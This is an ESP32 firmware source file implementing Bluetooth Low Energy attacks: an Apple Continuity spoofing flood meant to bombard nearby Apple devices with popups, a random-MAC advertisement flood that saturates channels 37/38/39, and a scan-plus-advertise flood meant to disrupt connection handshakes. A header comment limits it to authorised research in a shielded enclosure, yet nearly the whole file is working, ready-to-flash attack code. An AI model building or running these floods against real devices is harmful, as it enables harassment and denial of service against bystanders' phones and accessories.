// ble_attack.cpp
// BLE-layer attacks using the ESP32's built-in NimBLE radio.
// Intended for academic / authorised security research only.
// All tests must be performed inside a shielded (Faraday) enclosure.
//
// Targets:
//   - Apple BLE Continuity protocol flood (AirDrop, Handoff, Nearby, etc.)
//   - Generic BLE advertisement flood (random MACs, max advertising rate)
//   - BLE GATT/connection-channel data flood via advertisement payload stuffing
//
// Method: The NimBLE stack is configured to send raw HCI advertising commands
// at maximum rate.  Because the ESP32's BLE radio uses the same 2.4 GHz band
// (channels 37/38/39) as the nRF24 modules but is driven independently, these
// two radio paths can run simultaneously without conflict.
//
// NOTE ON THE FIXES IN THIS FILE
// ------------------------------
//   1) The SoftAP (if enabled) is torn down and WiFi is set to WIFI_OFF for
//      the duration of the BLE flood, then restored.  ESP32 classic has
//      Wi-Fi/BT coexistence, but in a Faraday room Wi-Fi is not needed and
//      disabling it removes interference + frees the radio for BLE.
//   2) A proper static-random BLE address is generated per iteration.
//      NimBLE 2.x uses `NimBLEDevice::setOwnAddr()` (not `setRandomAddress`,
//      which was removed).
//   3) Manufacturer payload was reduced to 24 bytes (was 26) so the total
//      advertisement fits comfortably inside the 31-byte legacy ADV limit.
//   4) `start()` return value is checked; on failure we yield and retry.

#include "ble_attack.h"

// ---------------------------------------------------------------------------
// Internal helpers
// ---------------------------------------------------------------------------

// Reusable NimBLE advertising instance (lazy-init).
static NimBLEAdvertising *s_adv = nullptr;

static bool s_bleInitialized = false;

/// Ensure NimBLEDevice is initialised exactly once.  Also frees the Wi-Fi
/// radio so BLE has uncontested access to 2.4 GHz.
static void ensureBLEInit()
{
  if ( s_bleInitialized )
    return;

  if ( access_point == 0 )
    WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
  delay(100);

  NimBLEDevice::init("");
  NimBLEDevice::setMTU(23);
  // Use maximum TX power for research purposes.
  NimBLEDevice::setPower(ESP_PWR_LVL_P9);
  s_bleInitialized = true;
}

/// Tear down NimBLE, restore the SoftAP if it was configured, then kill the
/// calling FreeRTOS task.  Every BLE attack function must end by calling this.
static void shutdownBLE()
{
  if ( s_bleInitialized )
  {
    NimBLEDevice::deinit(true);
    s_bleInitialized = false;
  }

  if ( access_point == 0 )
  {
    WiFi.mode(WIFI_AP);
    delay(50);
    WiFi.softAP(ssid.c_str(), password.c_str());
  }

  vTaskDelete(NULL);
}

/// Generate a new static-random BLE address (top two bits of byte 5 must be 11).
static void generateRandomAddress(uint8_t out[6], uint32_t &seed)
{
  for ( int i = 0; i < 6; i++ )
  {
    seed    = seed * 1664525UL + 1013904223UL;
    out[i]  = (seed >> 16) & 0xFF;
  }
  out[5] = (out[5] & 0x3F) | 0xC0; // static random address
}

/// Build a raw manufacturer-specific payload that mimics the Apple Continuity
/// frame format.  The opcode selects which Continuity sub-type to spoof:
///   0x05 – AirDrop
///   0x07 – AirPods proximity
///   0x0A – Nearby Action (QuickStart / Device Setup)
///   0x0C – Handoff
///   0x10 – Nearby Info
static void buildApplePayload(NimBLEAdvertisementData &data, uint8_t opcode, uint32_t seed)
{
  // Apple OUI = 0x004C
  uint8_t mfr[24];
  mfr[0] = 0x4C;   // Apple OUI (little-endian)
  mfr[1] = 0x00;
  mfr[2] = opcode; // Continuity type
  uint8_t payloadLen = 16;
  mfr[3]             = payloadLen;

  // Fill payload bytes with pseudo-random data derived from seed so that
  // each advertisement looks like a different device / state.
  for ( int i = 0; i < (int)payloadLen && i < (int)(sizeof(mfr) - 4); i++ )
  {
    seed = seed * 1664525UL + 1013904223UL; // LCG
    mfr[4 + i] = (seed >> 16) & 0xFF;
  }

  std::string mfrStr(reinterpret_cast<char *>(mfr), 4 + payloadLen);
  data.setManufacturerData(mfrStr);
}

// ---------------------------------------------------------------------------
// Public attack functions
// ---------------------------------------------------------------------------

/// Apple BLE Continuity flood.
/// Rapidly cycles through all seven Continuity opcodes with randomised payloads
/// so that nearby Apple devices are bombarded with pairing / notification popups.
void apple_ble_flood()
{
  Serial.println("[apple_ble_flood] task entered");

  ensureBLEInit();

  s_adv = NimBLEDevice::getAdvertising();
  s_adv->stop();

  // Cycle through Apple Continuity opcodes.
  static const uint8_t opcodes[] = {0x05, 0x07, 0x09, 0x0A, 0x0C, 0x0F, 0x10};
  int      opIdx = 0;
  uint32_t seed  = esp_random();
  uint8_t  rndAddr[6];

  // External stop flag from the jamHandler infrastructure.
  extern bool stopJam;

  while ( !stopJam )
  {
    updateJoystickButtons();

    // Fresh static-random MAC per advertisement.
    generateRandomAddress(rndAddr, seed);
    NimBLEDevice::setOwnAddr(rndAddr);          // <-- NimBLE 2.x API
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);

    NimBLEAdvertisementData advData;
    advData.setFlags(0x1A); // LE General Discoverable, BR/EDR not supported
    buildApplePayload(advData, opcodes[opIdx], seed);

    // Randomise the advertised name to increase uniqueness.
    seed         = seed * 1664525UL + 1013904223UL;
    char name[5] = {0};
    name[0]      = 'A' + (seed & 0x0F);
    name[1]      = 'B' + ((seed >> 4) & 0x0F);
    name[2]      = '\0';
    advData.setName(name);

    s_adv->setAdvertisementData(advData);
    s_adv->setMinInterval(20); // 20 × 0.625 ms = 12.5 ms — fastest BT-legal rate
    s_adv->setMaxInterval(20);

    if ( s_adv->start(0) )
    {
      delayMicroseconds(3000);
      s_adv->stop();
    }
    else
    {
      delay(5); // couldn't start — yield, retry next iteration
    }

    opIdx = (opIdx + 1) % (sizeof(opcodes) / sizeof(opcodes[0]));
    seed += millis();
  }

  s_adv->stop();
  shutdownBLE();
}

/// Generic BLE advertisement flood with random MAC addresses and payloads.
/// Saturates BLE advertising channels 37/38/39 at the maximum legal rate.
void ble_adv_flood()
{
  Serial.println("[ble_adv_flood] task entered");

  ensureBLEInit();

  s_adv = NimBLEDevice::getAdvertising();
  s_adv->stop();

  uint32_t seed = esp_random();
  uint8_t  rndAddr[6];

  extern bool stopJam;

  while ( !stopJam )
  {
    updateJoystickButtons();

    seed = seed * 1664525UL + 1013904223UL;

    // Fresh static-random MAC per advertisement.
    generateRandomAddress(rndAddr, seed);
    NimBLEDevice::setOwnAddr(rndAddr);          // <-- NimBLE 2.x API
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);

    NimBLEAdvertisementData advData;
    advData.setFlags(0x06);

    // Random manufacturer data payload (24 bytes leaves room for flags
    // and the AD type/length fields inside the 31-byte legacy limit).
    uint8_t mfrPayload[24];
    for ( int i = 0; i < 24; i++ )
    {
      seed          = seed * 1664525UL + 1013904223UL;
      mfrPayload[i] = (seed >> 16) & 0xFF;
    }
    advData.setManufacturerData(std::string(reinterpret_cast<char *>(mfrPayload), 24));

    s_adv->setAdvertisementData(advData);
    s_adv->setMinInterval(20);
    s_adv->setMaxInterval(20);

    if ( s_adv->start(0) )
    {
      delayMicroseconds(2500);
      s_adv->stop();
    }
    else
    {
      delay(5);
    }
  }

  s_adv->stop();
  shutdownBLE();
}

/// BLE scanner flood: puts the ESP32 in scanning mode while simultaneously
/// advertising on 37/38/39 so that BLE devices in range are continuously
/// solicited, disrupting connection-establishment handshakes.
void ble_scan_flood()
{
  Serial.println("[ble_scan_flood] task entered");

  ensureBLEInit();

  NimBLEScan *scanner = NimBLEDevice::getScan();
  scanner->setActiveScan(true);
  scanner->setInterval(40);
  scanner->setWindow(40); // scan window == interval → 100 % duty cycle

  s_adv = NimBLEDevice::getAdvertising();
  s_adv->stop();

  uint32_t seed = esp_random();
  uint8_t  rndAddr[6];

  extern bool stopJam;

  while ( !stopJam )
  {
    updateJoystickButtons();

    seed = seed * 1664525UL + 1013904223UL;

    generateRandomAddress(rndAddr, seed);
    NimBLEDevice::setOwnAddr(rndAddr);          // <-- NimBLE 2.x API
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);

    // Start a short scan burst.
    scanner->start(0, false); // non-blocking

    // Simultaneously advertise with random payload.
    NimBLEAdvertisementData advData;
    advData.setFlags(0x1A);
    uint8_t mfr[8];
    for ( int i = 0; i < 8; i++ )
    {
      seed  = seed * 1664525UL + 1013904223UL;
      mfr[i] = (seed >> 16) & 0xFF;
    }
    advData.setManufacturerData(std::string(reinterpret_cast<char *>(mfr), 8));
    s_adv->setAdvertisementData(advData);
    s_adv->setMinInterval(20);
    s_adv->setMaxInterval(20);

    if ( s_adv->start(0) )
    {
      delay(30);
      s_adv->stop();
    }
    else
    {
      delay(5);
    }
    scanner->stop();
  }

  s_adv->stop();
  scanner->stop();
  shutdownBLE();
}